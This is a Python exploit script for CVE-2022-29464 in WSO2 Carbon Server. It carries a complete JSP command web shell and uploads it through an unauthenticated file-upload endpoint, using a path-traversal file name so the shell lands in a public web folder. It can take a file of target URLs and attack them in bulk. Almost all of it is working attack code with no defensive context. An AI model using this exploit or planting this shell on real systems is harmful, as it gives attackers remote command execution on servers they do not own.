from ast import arg
import os
import requests
import urllib3
import argparse
from rich.console import Console
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

shell= '''<%@ page import="java.util.*,java.io.*"%>

<html>
<body>
<font size=12 color=cyan><center><strong>@CallMeRep</strong> .jsp cmd shells </center></font><br></center>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
        if (request.getParameter("cmd") != null ) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Runtime rt = Runtime.getRuntime();
            Process p = rt.exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
            }
        }
    %>
    </pre>
</body>
</html>'''


def exploit(url):
    try:
        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=2, verify=False,allow_redirects=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/dailytools.jsp": shell})
        if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
            # print(resp.content)
            console.log(f"[green][<>] Successfully exploited, url : [bold]{url}/authenticationendpoint/dailytools.jsp[/bold][/green]")
        else:
            console.log(f"\r[red][!] {url}/fileupload/toolsAny Fail [/red] {url}")
    except (requests.exceptions.Timeout,requests.exceptions.ConnectionError,requests.exceptions.InvalidURL):
        console.log(f"[red][!] {url}/fileupload/toolsAny Fail Cant Requests [/red]")
    


def main():
    parser = argparse.ArgumentParser(description="WSO2 Carbon Server CVE-2022-29464")
    parser.add_argument("-u", help="WSO2 Carbon Server URL")
    parser.add_argument("-f", help="URL File")
    args = parser.parse_args()
    if args.f:
        links = []
        with open(f"{os.getcwd()}/{args.f}","r") as f:
            tmp = f.readlines()
            for link in tmp:
                link = link.replace('\n','')
                if not '://' in link:
                    link = f"https://{link}"
                links.append(link)
        with console.status("[bold green]Exploiting...") as status:
            for link in links:
                exploit(link)
    else:
        url = args.u
        exploit(url)                
        
    

if "__main__" == __name__:
    main()



